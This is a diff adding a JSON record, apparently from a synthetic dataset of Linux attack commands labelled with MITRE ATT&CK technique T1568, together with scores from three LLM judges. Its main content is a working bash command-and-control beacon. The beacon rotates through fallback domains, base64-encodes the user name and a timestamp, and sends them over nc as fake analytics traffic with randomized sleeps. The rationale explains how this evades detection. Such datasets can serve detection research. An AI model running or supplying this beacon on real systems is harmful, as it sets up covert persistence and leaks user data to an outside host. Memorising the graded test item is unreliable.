@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"while true; do host=metrics.example.org; ip=''; for h in \\\"$host\\\" cdn-metrics.example.org assets.example.net; do ip=$(dig +short \\\"$h\\\" | shuf -n1); if [ -n \\\"$ip\\\" ]; then host=\\\"$h\\\"; break; fi; done; ua=\\\"Mozilla/5.0 (X11; Linux)\\\"; ts=$(date -u +%s); q=\\\"q=$(printf '%s:%s' \\\"$USER\\\" \\\"$ts\\\" | base64 -w0)\\\"; printf 'GET /collect?%s HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nConnection: close\\r\\n\\r\\n' \\\"$q\\\" \\\"$host\\\" \\\"$ua\\\" | nc -w 5 \\\"$ip\\\" 80; sleep $((RANDOM%60+120)); done\"",
+  "explanation": "Sets up a periodic beacon that re-resolves a preferred domain each cycle with fallback domains to maintain persistence; sends base64 data in a query string to mimic analytics collection.",
+  "rationale_steps": [
+    "Continuously re-resolve C2 host at runtime to track fast-changing IPs.",
+    "Fallback to secondary domains when resolution fails.",
+    "Use realistic HTTP GET with query params and standard headers.",
+    "Randomize sleep intervals to blend with user activity patterns."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-654de9c0",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and appropriate escape sequences throughout the complex bash script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1568 Dynamic Resolution technique by using multiple fallback domains, DNS resolution with dig, randomized sleep intervals, and establishing a periodic beacon that mimics legitimate analytics traffic.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:48:54.832408Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, correct command substitutions, valid flag usage for all included utilities, and proper shell syntax throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1568 Dynamic Resolution by re-resolving C2 endpoints at runtime, including fallback domains, and establishing a periodic beacon that mimics legitimate analytics collection with randomized sleep intervals.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T07:49:07.708579Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The bash one-liner is well-formed with balanced quoting, proper separators, valid expansions, and standard options, making it parseable as-is.",
+        "semantic_score": 5,
+        "semantic_justification": "It implements periodic beaconing that re-resolves and randomly selects active IPs from a fallback domain list each cycle, aligning with dynamic resolution/rotating endpoint behavior under T1568.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:49:36.466530Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
